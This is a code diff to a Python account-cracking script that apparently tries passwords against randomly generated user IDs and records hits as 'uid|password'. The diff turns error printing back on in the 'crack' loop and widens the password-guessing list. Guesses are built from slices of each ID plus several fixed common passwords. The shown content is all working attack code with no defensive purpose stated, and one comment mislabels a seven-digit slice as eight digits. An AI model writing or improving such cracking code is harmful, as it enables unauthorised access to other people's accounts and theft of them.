@@ -237,23 +237,23 @@ def crack(uid, password_list, total_count):
                 cps.append(uid+"|"+pw)
                 continue
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
+                print(f"\r\033[1;91m [ERROR] - Status code {respon.status_code}")
                 continue
                 
     except requests.exceptions.Timeout:
-        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
+        print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
     except requests.exceptions.ConnectionError:
         time.sleep(5)
         return False
     except requests.exceptions.RequestException as e:
-        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
         return False
     except KeyboardInterrupt:
         print(f"\r\033[1;93m [Interrupted] User stopped the process")
         raise
     except Exception as e:
-        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
+        print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
         return False
     
     return False
@@ -269,10 +269,13 @@ def generate_random_ids(limit):
 def get_password_patterns(uid):
     """Generate password patterns based on UID"""
     return [
-        '57273200',  # Static common password
         uid[:6],     # First 6 digits
+        uid[:7],     # First 8 digits
         uid[:8],     # First 8 digits
         uid,         # Full number
+        '57273200',  # Static common password
+        '57575751', # Static common password
+        '57575752',# Static common password
     ]
 
 def random_number():
